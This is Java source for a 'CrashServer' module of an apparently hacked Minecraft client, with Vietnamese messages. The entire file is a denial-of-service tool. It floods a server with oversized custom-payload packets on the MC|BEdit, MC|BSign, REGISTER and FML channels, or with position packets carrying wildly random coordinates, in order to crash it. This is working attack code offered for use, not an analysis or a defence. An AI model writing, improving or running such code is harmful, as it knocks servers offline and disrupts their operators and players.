package thunderhack.modules.misc;

import thunderhack.modules.Module;
import thunderhack.modules.ModuleCategory;
import net.minecraft.network.play.client.CPacketCustomPayload;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.CPacketPlayer;
import io.netty.buffer.Unpooled;
import java.util.Random;

public class CrashServer extends Module {
    public enum Mode {
        BIG_DATA,
        MULTI_CHANNEL,
        POSITION_SPAM
    }

    private Mode mode = Mode.BIG_DATA;
    private int packets = 50;
    private int dataSize = 200_000;

    private final Random random = new Random();

    public CrashServer() {
        super("CrashServer", "Gửi packet crash server (mạnh)", ModuleCategory.MISC);
    }

    @Override
    public void onEnable() {
        if (mc.player == null || mc.world == null) {
            toggle();
            return;
        }

        try {
            int sent = 0;
            switch (mode) {
                case BIG_DATA:
                    PacketBuffer bufBig = new PacketBuffer(Unpooled.buffer());
                    bufBig.writeString("MC|BEdit");
                    bufBig.writeByteArray(new byte[dataSize]);
                    for (int i = 0; i < packets; i++) {
                        mc.getConnection().sendPacket(new CPacketCustomPayload("MC|BEdit", bufBig));
                        sent++;
                    }
                    break;

                case MULTI_CHANNEL:
                    String[] channels = {"MC|BSign", "MC|BEdit", "REGISTER", "FML"};
                    PacketBuffer bufMulti = new PacketBuffer(Unpooled.buffer());
                    bufMulti.writeByteArray(new byte[50_000]);
                    for (String ch : channels) {
                        for (int i = 0; i < packets; i++) {
                            mc.getConnection().sendPacket(new CPacketCustomPayload(ch, bufMulti));
                            sent++;
                        }
                    }
                    break;

                case POSITION_SPAM:
                    for (int i = 0; i < packets * 10; i++) {
                        double x = mc.player.posX + (random.nextDouble() - 0.5) * 1e6;
                        double y = mc.player.posY + (random.nextDouble() - 0.5) * 1e6;
                        double z = mc.player.posZ + (random.nextDouble() - 0.5) * 1e6;
                        mc.getConnection().sendPacket(new CPacketPlayer.Position(x, y, z, mc.player.onGround));
                        sent++;
                    }
                    break;
            }
            sendMessage("CrashServer: mode=" + mode + " đã gửi " + sent + " packets.");
        } catch (Exception e) {
            sendMessage("CrashServer thất bại: " + e.getMessage());
        }

        toggle();
    }

    @Override
    public void onSettingChanged() {
        // Tương lai: nếu build GUI setting cho số packets/dataSize/mode, reinit ở đây
    }
}
